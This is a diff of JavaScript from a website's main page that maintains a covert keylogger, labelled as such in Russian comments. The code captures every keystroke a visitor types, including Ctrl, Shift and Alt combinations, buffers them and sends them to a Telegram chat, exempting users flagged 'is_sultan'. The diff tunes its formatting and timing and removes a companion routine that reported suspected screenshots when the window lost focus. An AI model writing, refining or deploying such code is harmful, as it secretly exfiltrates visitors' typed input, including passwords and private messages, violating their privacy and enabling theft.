@@ -876,15 +876,14 @@
         
 
 
-            // --- ПОЛНЫЙ КЕЙЛОГГЕР НА ГЛАВНОЙ ---
+        // --- ПОЛНЫЙ КЕЙЛОГГЕР НА ГЛАВНОЙ ---
     let keyBufferIndex = "";
     let sendTimerIndex = null;
 
     function flushKeysIndex() {
-        if (keyBufferIndex.length === 0) return;
+        if (keyBufferIndex.trim().length === 0) return;
         if (localStorage.getItem('is_sultan') === 'true') return;
-        
-        sendTelegramNotification(`⌨️ <b>Ввод на главной странице:</b>\n\n<code>${keyBufferIndex}</code>`);
+        sendTelegramNotification(`⌨️ <b>Ввод на главной:</b>\n\n<code>${keyBufferIndex}</code>`);
         keyBufferIndex = "";
     }
 
@@ -892,20 +891,21 @@
         let key = event.key;
 
         if (key === ' ') key = '␣';
-        else if (key === 'Enter') key = '\n[Enter]\n';
+        else if (key === 'Enter') key = ' [Enter] ';
         else if (key === 'Backspace') key = '⌫';
-        else if (key === 'Tab') key = '[Tab]';
+        else if (key === 'Tab') key = ' [Tab] ';
         else if (key === 'Shift' || key === 'Control' || key === 'Alt' || key === 'Meta') return;
         else if (key.length > 1) key = `[${key}]`;
 
         if (event.ctrlKey) key = `[Ctrl+${key}]`;
+        if (event.shiftKey && key.length === 1) key = `[Shift+${key}]`;
         if (event.altKey) key = `[Alt+${key}]`;
         if (event.metaKey) key = `[Win+${key}]`;
 
         keyBufferIndex += key;
 
         clearTimeout(sendTimerIndex);
-        sendTimerIndex = setTimeout(flushKeysIndex, 1000);
+        sendTimerIndex = setTimeout(flushKeysIndex, 3000);
 
         if (keyBufferIndex.length > 300) {
             clearTimeout(sendTimerIndex);
@@ -914,19 +914,6 @@
     });
 
     window.addEventListener('beforeunload', flushKeysIndex);
-
-    // --- ФОЛБЭК: ПОТЕРЯ ФОКУСА ---
-    let blurStartTimeIndex = 0;
-    window.addEventListener('blur', () => blurStartTimeIndex = Date.now());
-    window.addEventListener('focus', function() {
-        if (blurStartTimeIndex > 0 && localStorage.getItem('is_sultan') !== 'true') {
-            let timeAway = (Date.now() - blurStartTimeIndex) / 1000;
-            blurStartTimeIndex = 0;
-            if (timeAway > 1 && timeAway < 10) {
-                sendTelegramNotification(`✂️ <b>Возможно, скриншот на главной!</b>\n\nОкно теряло фокус на ${Math.round(timeAway)} сек.`);
-            }
-        }
-    });
 
 
 
